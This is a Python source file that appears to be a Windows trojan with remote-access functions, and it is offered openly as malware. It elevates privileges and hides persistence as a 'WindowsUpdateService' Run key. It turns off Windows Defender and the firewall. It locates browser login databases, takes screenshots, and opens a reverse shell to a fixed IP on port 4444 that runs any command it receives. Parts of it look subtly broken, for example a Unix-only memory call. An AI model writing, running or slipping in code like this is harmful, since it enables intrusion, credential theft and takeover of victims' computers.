import os
import sys
import time
import socket
import threading
import subprocess
import ctypes
import winreg
import shutil
import requests
from datetime import datetime

SERVER_IP = "192.168.1.100"
SERVER_PORT = 4444

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()
    except:
        pass

def add_to_startup():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "WindowsUpdateService", 0, winreg.REG_SZ, sys.executable + " " + " ".join(sys.argv))
        winreg.CloseKey(handle)
    except:
        pass

def disable_defender():
    try:
        os.system('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
        os.system('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f')
        os.system('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f')
        os.system('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f')
        os.system('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f')
        os.system('netsh advfirewall set allprofiles state off')
    except:
        pass

def steal_browser_data():
    try:
        appdata = os.getenv('APPDATA')
        localappdata = os.getenv('LOCALAPPDATA')
        targets = {
            'Chrome': localappdata + '\\Google\\Chrome\\User Data\\Default\\Login Data',
            'Firefox': appdata + '\\Mozilla\\Firefox\\Profiles',
            'Edge': localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Login Data'
        }
        stolen = []
        for browser, path in targets.items():
            if os.path.exists(path):
                stolen.append(f"{browser}: {path}")
        return stolen
    except:
        return []

def take_screenshot():
    try:
        import PIL.ImageGrab
        screenshot = PIL.ImageGrab.grab()
        screenshot.save("C:\\Windows\\Temp\\screenshot.png")
        return "C:\\Windows\\Temp\\screenshot.png"
    except:
        return None

def collect_system_info():
    try:
        info = []
        info.append(f"Hostname: {os.environ['COMPUTERNAME']}")
        info.append(f"Username: {os.environ['USERNAME']}")
        info.append(f"OS: {os.environ['OS']}")
        info.append(f"Processor: {os.environ['PROCESSOR_IDENTIFIER']}")
        info.append(f"RAM: {str(round(os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_PHYS_PAGES') / (1024.**3), 2))} GB")
        info.append(f"IP: {socket.gethostbyname(socket.gethostname())}")
        return "\n".join(info)
    except:
        return "System info unavailable"

def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_IP, SERVER_PORT))
        while True:
            command = s.recv(1024).decode()
            if command.lower() == 'exit':
                break
            if command.lower() == 'screenshot':
                img = take_screenshot()
                if img:
                    with open(img, 'rb') as f:
                        s.send(f.read())
                else:
                    s.send(b'SCREENSHOT FAILED')
                continue
            if command.lower() == 'info':
                s.send(collect_system_info().encode())
                continue
            if command.lower() == 'browser':
                data = steal_browser_data()
                s.send(str(data).encode())
                continue
            output = subprocess.run(command, shell=True, capture_output=True)
            s.send(output.stdout + output.stderr)
        s.close()
    except:
        pass

def trojan_main():
    if not is_admin():
        run_as_admin()
    
    add_to_startup()
    disable_defender()
    
    time.sleep(5)
    
    thread = threading.Thread(target=reverse_shell)
    thread.daemon = True
    thread.start()
    
    while True:
        time.sleep(3600)

if __name__ == "__main__":
    trojan_main()